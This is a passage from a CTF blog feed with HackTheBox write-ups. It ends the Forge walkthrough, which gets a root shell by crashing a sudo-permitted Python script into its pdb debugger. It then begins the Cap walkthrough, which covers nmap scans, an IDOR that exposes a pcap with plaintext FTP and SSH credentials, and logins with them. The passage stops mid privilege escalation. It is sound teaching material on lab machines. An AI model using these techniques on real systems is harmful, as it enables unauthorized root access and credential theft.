+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User user may run the following commands on forge:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">user@forge:~$ ls -l /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">1447</span> May <span class="m">31</span> 12:09 /opt/remote-manage.py</span></span></code></pre>
+</figure><h4 id="source-code-review">Source Code Review</h4>
+<p>Looking at the source code, this script is a simple tool for monitoring process, disk, and network sockets.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pdb</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1025</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Listening on localhost:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">clientsock</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the secret passsword: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">clientsock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">!=</span> <span class="s1">&#39;secretadminpassword&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Wrong password!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Welcome admin!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">What do you wanna do: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[1] View processes</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[2] View free memory</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[3] View listening sockets</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[4] Quit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">option</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">clientsock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;ps aux&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;df&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;ss -lnt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Bye</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pdb</span><span class="o">.</span><span class="n">post_mortem</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">__traceback__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">quit</span><span class="p">()</span></span></span></code></pre>
+</figure><p>There&rsquo;s a hardcoded password of <code>secretadminpassword</code>. One that stands out in this code is the error/exception handling. When an exception triggered, the apps will call the Python debugger (<code>pdb</code>).  Since PDB is an interactive debugger, it is possible to <strong>run Python code</strong> during a debug session.</p>
+<p>To enter the debug session, I need to intentionally cause an error to the tool and this can be achieved by sending a SIGINT.</p>
+<h4 id="exploitation">Exploitation</h4>
+<p>First, I&rsquo;ll run the script with <code>sudo</code> and I&rsquo;ll open another SSH sessions.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">Listening on localhost:51411</span></span></code></pre>
+</figure><p>On the second SSH session, I&rsquo;ll connect to <code>26713</code> using <code>nc</code> and immediately send a SIGINT with <code>CTRL+C</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ nc 127.0.0.1 <span class="m">51411</span>
+</span></span><span class="line"><span class="cl">Enter the secret passsword: secretadminpassword
+</span></span><span class="line"><span class="cl">Welcome admin!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">What <span class="k">do</span> you wanna <span class="k">do</span>: 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> View processes
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> View free memory
+</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> View listening sockets
+</span></span><span class="line"><span class="cl"><span class="o">[</span>4<span class="o">]</span> Quit
+</span></span><span class="line"><span class="cl">^C</span></span></code></pre>
+</figure><p>On the first SSH session, it&rsquo;s now has the Pdb prompt (debug session).</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:/opt$ sudo /usr/bin/python3 /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">Listening on localhost:51411
+</span></span><span class="line"><span class="cl">invalid literal <span class="k">for</span> int<span class="o">()</span> with base 10: b<span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">&gt; /opt/remote-manage.py<span class="o">(</span>27<span class="o">)</span>&lt;module&gt;<span class="o">()</span>
+</span></span><span class="line"><span class="cl">-&gt; <span class="nv">option</span> <span class="o">=</span> int<span class="o">(</span>clientsock.recv<span class="o">(</span>1024<span class="o">)</span>.strip<span class="o">())</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>Pdb<span class="o">)</span> </span></span></code></pre>
+</figure><p>Since it&rsquo;s a root process, I&rsquo;ve full access now on the system.</p>
+<p><div class="img-container"><img src="imgs/image-20221015130859441.png" alt="image-20221015130859441"  /></div>
+</p>
+<p>I&rsquo;ll run <code>os.system('/bin/bash')</code> to spawn root shell and grab the root flag.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>Pdb<span class="o">)</span> os.system<span class="o">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@forge:/opt# ls -l /root/root.txt 
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root <span class="m">33</span> Oct <span class="m">15</span> 03:08 /root/root.txt
+</span></span><span class="line"><span class="cl">root@forge:/opt# 
+</span></span><span class="line"><span class="cl">root@forge:/opt# cat /root/root.txt 
+</span></span><span class="line"><span class="cl">73930b...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
+</figure>]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Cap</title>
+      <link>https://fahmifj.github.io/ctf/hackthebox/cap/</link>
+      <pubDate>Thu, 14 Oct 2021 04:42:42 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/ctf/hackthebox/cap/</guid>
+      <description>Cap starts by identifying an IDOR vulnerability on its hosted website. Using this IDOR, I can obtain a pcap file containing a set of FTP login credentials that can also be used for SSH login. Enumerating the system reveals that the installed Python binary has the CAP_SETUID capability set, which can be exploited to gain root access.
+Skills Learned Identifying/Exploiting IDOR Exploiting CAP_SETUID on Python Tools nmap wireshark Reconnaissance Nmap Running nmap scan against this machine reveals 3 open ports: SSH on 22, FTP on 21, and HTTP on 80.</description>
+      <content:encoded><![CDATA[<p>Cap starts by identifying an IDOR vulnerability on its hosted website. Using this IDOR, I can obtain a <code>pcap</code> file containing a set of FTP login credentials that can also be used for SSH login. Enumerating the system reveals that the installed Python binary has the <code>CAP_SETUID</code> capability set, which can be exploited to gain root access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Identifying/Exploiting IDOR</li>
+<li>Exploiting CAP_SETUID on Python</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>nmap</li>
+<li>wireshark</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Running <code>nmap</code> scan against this machine reveals 3 open ports: SSH on 22, FTP on 21, and HTTP on 80.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cap» «10.10.14.34» 
+</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.10.245        
+</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-09 05:07 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.245
+</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.070s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
+</span></span><span class="line"><span class="cl">Reason: <span class="m">65532</span> resets
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">21/tcp open  ftp     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 45.33 seconds
+</span></span><span class="line"><span class="cl">→ root@kali «cap» «10.10.14.34» 
+</span></span><span class="line"><span class="cl">$ nmap -p21,22,80 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.245
+</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-09 05:08 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.245
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.062s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    gunicorn
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">404</span> NOT FOUND
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: gunicorn
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Wed, <span class="m">09</span> Jun <span class="m">2021</span> 09:08:25 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">232</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;404 Not Found&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;h1&gt;Not Found&lt;/h1&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: gunicorn
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Wed, <span class="m">09</span> Jun <span class="m">2021</span> 09:08:19 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">19386</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;no-js&#34;</span> <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;x-ua-compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;Security Dashboard&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;shortcut icon&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;image/png&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/images/icon/favicon.ico&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/bootstrap.min.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/font-awesome.min.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/themify-icons.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/metisMenu.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/owl.carousel.min.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/slicknav.min.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: gunicorn
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Security Dashboard
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port80-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/9%Time<span class="o">=</span>60C08501%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>GetRe
+</span></span><span class="line"><span class="cl">SF:quest,2FE5,<span class="s2">&#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20W
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 131.73 seconds</span></span></span></code></pre>
+</figure><p>Since <code>nmap</code> didn&rsquo;t show anonymous login in FTP, I will head to the website.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>When I get to the website on port 80, I find that I&rsquo;ve already logged in as Nathan.</p>
+<p><div class="img-container"><img src="imgs/image-20210609162151343.png" alt="image-20210609162151343"  /></div>
+</p>
+<p>There are some menu in the side navigation bar. One menu that I find interesting is the &ldquo;Security Snapshot&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210609162215061.png" alt="image-20210609162215061"  /></div>
+</p>
+<p>In the &ldquo;Security Snapshot&rdquo; page, there is a download button which gives me a <code>pcap</code> file. Based on the URL, it seems there are 8 pcap files that have been generated so far.</p>
+<p><div class="img-container"><img src="imgs/image-20210609162434839.png" alt="image-20210609162434839"  /></div>
+</p>
+<p>When I open the <code>pcap</code> file, it was empty.</p>
+<h4 id="idor">IDOR</h4>
+<p>The download URL for pcap file is interesting here, and when I change it to 0, it pops another download prompt.</p>
+<p><div class="img-container"><img src="imgs/image-20210609162545619.png" alt="image-20210609162545619"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-nathan">Shell as nathan</h3>
+<h4 id="pcap-analysis">Pcap Analysis</h4>
+<p>There are quite a lot of traffic captured in this <code>0.pcap</code> file, but if I filter it to only show FTP, it shows that there is an FTP login performed by user <strong>nathan</strong>. Since there is no encryption, I can also see the login password.</p>
+<p><div class="img-container"><img src="imgs/image-20210609162111265.png" alt="image-20210609162111265"  /></div>
+</p>
+<h4 id="ftp-access">FTP access</h4>
+<p>Entering <code>nathan:Buck3tH4Tf0RM3</code> logs me in into the FTP server, and I can read the user flag from there.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cap» «10.10.14.34» 
+</span></span><span class="line"><span class="cl">$ ftp 10.10.10.245
+</span></span><span class="line"><span class="cl">Connected to 10.10.10.245.
+</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.10.245:root<span class="o">)</span>: nathan
+</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
+</span></span><span class="line"><span class="cl">-rw-rw-r--    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>         <span class="m">8088</span> Jun <span class="m">09</span> 08:04 25134.c
+</span></span><span class="line"><span class="cl">-rwxrwxr-x    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>        <span class="m">18360</span> Jun <span class="m">09</span> 08:25 exp
+</span></span><span class="line"><span class="cl">-rwxrwxr-x    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>       <span class="m">342868</span> Jun <span class="m">09</span> 06:24 linpeas.sh
+</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">3</span> <span class="m">1001</span>     <span class="m">1001</span>         <span class="m">4096</span> Jun <span class="m">09</span> 06:26 snap
+</span></span><span class="line"><span class="cl">-r--------    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>           <span class="m">33</span> Jun <span class="m">09</span> 04:59 user.txt
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
+</span></span><span class="line"><span class="cl">ftp&gt; </span></span></code></pre>
+</figure><h4 id="ssh---nathan">SSH - nathan</h4>
+<p>The credentials can also be used for SSH login.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cap» «10.10.14.34» 
+</span></span><span class="line"><span class="cl">$ ssh nathan@10.10.10.245
+</span></span><span class="line"><span class="cl">nathan@10.10.10.245<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.2 LTS <span class="o">(</span>GNU/Linux 5.4.0-73-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Wed Jun  <span class="m">9</span> 09:35:15 UTC <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:           0.0
+</span></span><span class="line"><span class="cl">  Usage of /:            35.0% of 8.73GB
+</span></span><span class="line"><span class="cl">  Memory usage:          34%
+</span></span><span class="line"><span class="cl">  Swap usage:            0%
+</span></span><span class="line"><span class="cl">  Processes:             <span class="m">229</span>
+</span></span><span class="line"><span class="cl">  Users logged in:       <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> eth0: 10.10.10.245
+</span></span><span class="line"><span class="cl">  IPv6 address <span class="k">for</span> eth0: dead:beef::250:56ff:feb9:f2f1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="o">=</span>&gt; There are <span class="m">4</span> zombie processes.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Wed Jun  <span class="m">9</span> 08:53:04 <span class="m">2021</span> from 10.10.16.15
+</span></span><span class="line"><span class="cl">nathan@cap:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span></span></span></code></pre>
+</figure><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="web-source-code">Web source code</h4>
+<p>With shell access, I went to the web directory.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nathan@cap:/var/www/html$ ls -l
+</span></span><span class="line"><span class="cl">total <span class="m">24</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> nathan nathan <span class="m">4096</span> May <span class="m">27</span> 09:10 __pycache__
